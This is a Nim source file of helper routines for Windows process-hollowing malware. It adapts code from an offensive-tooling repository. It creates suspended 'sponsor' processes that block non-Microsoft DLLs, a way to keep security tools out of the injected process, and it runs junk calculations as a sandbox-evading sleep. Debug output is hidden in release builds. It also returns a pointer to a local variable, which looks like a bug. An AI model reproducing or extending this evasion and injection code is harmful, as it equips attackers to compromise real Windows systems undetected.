import math
import times 
import winim
import random


# Heavily stolen from https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
proc createSuspendedExtendedProcess*(processCmd: cstring, isBlockDlls: bool): PPROCESS_INFORMATION =

    # Some varaibles
    const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION
    var ps: SECURITY_ATTRIBUTES
    var ts: SECURITY_ATTRIBUTES
    var policy: DWORD64
    var lpSize: SIZE_T

    # Block all non microsoft DLL's policy in new process
    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
    
    # Init structs sizes and stuff
    si.StartupInfo.cb = sizeof(si).cint
    ps.nLength = sizeof(ps).cint
    ts.nLength = sizeof(ts).cint
    InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
    si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
    # Needed for handle inheritance in split hollow
    when defined(hollow4) or defined(hollow5) or defined(hollow6):
        ps.bInheritHandle = true
        ts.bInheritHandle = true

    # If isBlockDlls - update policy
    if isBlockDlls:
        if UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
            addr policy,
            sizeof(policy),
            NULL,
            NULL
        ) != TRUE:
            when not defined(release): echo "[-] Could not update process attribute to block Dlls"
            quit()

    # Create the suspended process
    when not defined(release): echo "[*] Creating sponsor process suspended"
    if CreateProcess(
        NULL,
        newWideCString(processCmd),
        ps,
        ts, 
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    ) != TRUE:
        when not defined(release): echo "[-] Could not create process: " & $GetLastError()
        quit()

    # Return updated process information
    return addr pi


proc sleepUselessCalculations*(secondsToSleep: int) =
    var x: float
    var y: float
    var z: float
    randomize()
    var startTime = now()
    while (now() - startTime).inSeconds < secondsToSleep:
        for _ in countdown(rand(569389), 87):
            x = rand(rand(rand(511.8388)) mod 9800)
            y = rand(rand(6813.9999)) + log2(cos(1.87 * PI)) 
            z = rand(839.3211789 - x mod y) 
            y = sqrt(float(x * y + 84)) * sqrt(float(x / (y + 1319))) + exp(float(x * z))


proc toString*(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)


proc onFail*(targetHandle: HANDLE) =
    when not defined(release): echo "[*] Quiting on failure :("
    TerminateProcess(targetHandle, 0)
    quit(1)